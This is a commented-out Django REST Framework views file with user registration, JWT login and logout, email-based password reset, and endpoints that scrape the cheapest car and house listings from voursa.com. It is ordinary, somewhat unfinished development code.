#         serializer = CustomUserSerializer(data=request.data)
#         if serializer.is_valid():
#             user = serializer.save()
#             if user:
#                 return Response({
#                     'success': True,
#                     'message': 'Registration successful',
#                     'redirect_url': '/signin/' 
#                 }, status=status.HTTP_201_CREATED)
#         return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)


# class LoginView(APIView):
#     permission_classes = [AllowAny]

#     def post(self, request):
#         email = request.data.get('email')
#         password = request.data.get('password')
#         user = authenticate(email=email, password=password)

#         if user:
#             refresh = RefreshToken.for_user(user)
#             return Response({
#                 'success': True,
#                 'refresh': str(refresh),
#                 'access': str(refresh.access_token),
#                 'user': CustomUserSerializer(user).data,
#                 'redirect_url': '/'
#             }, status=status.HTTP_200_OK)
#         return Response({'error': 'Invalid Credentials'}, status=status.HTTP_401_UNAUTHORIZED)


# class LogoutView(APIView):
#     permission_classes = [IsAuthenticated]

#     def post(self, request):
#         try:
#             refresh_token = request.data.get('refresh_token')
#             if not refresh_token:
#                 return Response({'error': 'Refresh token is required'}, status=status.HTTP_400_BAD_REQUEST)

#             token = RefreshToken(refresh_token)
#             token.blacklist()  
#             return Response({'message': 'Successfully logged out'}, status=status.HTTP_205_RESET_CONTENT)
#         except Exception as e:
#             return Response({'error': str(e)}, status=status.HTTP_400_BAD_REQUEST)
        

# class ForgotPasswordView(APIView):
#     permission_classes = [AllowAny]

#     def post(self, request):
#         email = request.data.get('email')
#         if not email:
#             return Response({'error': 'Email is required'}, status=status.HTTP_400_BAD_REQUEST)

#         try:
#             user = CustomUser.objects.get(email=email)
#         except CustomUser.DoesNotExist:
#             return Response({'error': 'User with this email does not exist'}, status=status.HTTP_404_NOT_FOUND)

        
#         token_generator = PasswordResetTokenGenerator()
#         token = token_generator.make_token(user)
#         uid = urlsafe_base64_encode(force_bytes(user.pk))

       
#         reset_link = f" http://127.0.0.1:8000/reset-password/{uid}/{token}/"

       
#         send_mail(
#             'Password Reset Request',
#             f'Click the link to reset your password: {reset_link}',
#             'laveapp24@gmail.com',
#             [user.email],
#             fail_silently=False,
#         )

#         return Response({'message': 'Password reset link sent to your email'}, status=status.HTTP_200_OK)
    
# class ResetPasswordView(APIView):
#     permission_classes = [AllowAny]

#     def get(self, request, uidb64, token):
#         return render(request, 'reset-password.html')

#     def post(self, request, uidb64, token):
#         password = request.data.get('password')
#         if not password:
#             return Response({'error': 'Password is required'}, status=status.HTTP_400_BAD_REQUEST)

#         try:
#             uid = force_str(urlsafe_base64_decode(uidb64))
#             user = CustomUser.objects.get(pk=uid)
#         except (TypeError, ValueError, OverflowError, CustomUser.DoesNotExist):
#             return Response({'error': 'Invalid user or token'}, status=status.HTTP_400_BAD_REQUEST)

#         token_generator = PasswordResetTokenGenerator()
#         if not token_generator.check_token(user, token):
#             return Response({'error': 'Invalid or expired token'}, status=status.HTTP_400_BAD_REQUEST)

#         user.set_password(password)
#         user.save()

#         return Response({'message': 'Password reset successfully'}, status=status.HTTP_200_OK)


# !---------------to Api view----------------
# # Convert   to API view
# @api_view(['GET'])
# def scrape_cars(request):
#     url = "https://www.voursa.com/Index.cfm?gct=1&sct=11&gv=13"
#     response = requests.get(url)

#     if response.status_code == 200:
#         soup = BeautifulSoup(response.content, 'html.parser')
#         cars = []
#         for car_div in soup.find_all('div', id='rptregion'):
#             title = car_div.find('div', id='titre').text.strip() if car_div.find('div', id='titre') else "N/A"
#             price = car_div.find('div', id='prix').text.strip() if car_div.find('div', id='prix') else "N/A"
#             price = float(price) if price.isdigit() else float('inf')
#             image_url = f"https://www.voursa.com{car_div.find('img')['src']}" if car_div.find('img') else "N/A"
#             link = f"https://www.voursa.com{car_div.find_parent('a')['href']}" if car_div.find_parent('a') else "N/A"
#             cars.append({
#                 'Title': title,
#                 'Price': price,
#                 'Image_URL': image_url,  
#                 'Link': link
#             })

#         sorted_cars = sorted(cars, key=lambda x: x['Price'])
#         cheapest_cars = sorted_cars[:10]
#         return Response(cheapest_cars, status=status.HTTP_200_OK)
#     return Response(
#         {'error': f"Failed to retrieve the website. Status code: {response.status_code}"}, 
#         status=status.HTTP_400_BAD_REQUEST
    # )

# # Convert scrape_houses to API view
# @api_view(['GET'])
# def scrape_houses(request):
#     url = "https://www.voursa.com/Index.cfm?gct=3&gv=13"
#     response = requests.get(url)

#     if response.status_code == 200:
#         soup = BeautifulSoup(response.content, 'html.parser')
#         houses = []
#         for house_div in soup.find_all('div', id='rptregion'):
#             title = house_div.find('div', id='titre').text.strip() if house_div.find('div', id='titre') else "N/A"
#             price = house_div.find('div', id='prix').text.strip() if house_div.find('div', id='prix') else "N/A"
#             price = float(price) if price.isdigit() else float('inf')
#             image_url = f"https://www.voursa.com{house_div.find('img')['src']}" if house_div.find('img') else "N/A"
#             link = f"https://www.voursa.com{house_div.find_parent('a')['href']}" if house_div.find_parent('a') else "N/A"
#             houses.append({
#                 'Title': title,
#                 'Price': price,
#                 'Image_URL': image_url,
#                 'Link': link
#             })

#         sorted_houses = sorted(houses, key=lambda x: x['Price'])
#         cheapest_houses = sorted_houses[:10]
#         return Response(cheapest_houses, status=status.HTTP_200_OK)
#     return Response(
#         {'error': f"Failed to retrieve the website. Status code: {response.status_code}"}, 
#         status=status.HTTP_400_BAD_REQUEST
#     )

# # Convert car selection related views to API views
# @api_view(['GET'])
# def car_selection(request):
#     return Response({"brands": list(marque_mapping.keys())})

# @api_view(['GET'])
# def get_models(request):
#     brand = request.GET.get('brand')
#     models = models_by_brand.get(brand, {})
#     return Response(models)

# @api_view(['GET'])
# def search_cars(request):
#     brand = request.GET.get('brand')
#     model = request.GET.get('model', '')
#     av = marque_mapping.get(brand, 0)
#     bv = models_by_brand.get(brand, {}).get(model, 0)
#     cars = scrape_cars(av, bv)
#     return Response(cars)

 # !---------------Enf to Api view----------------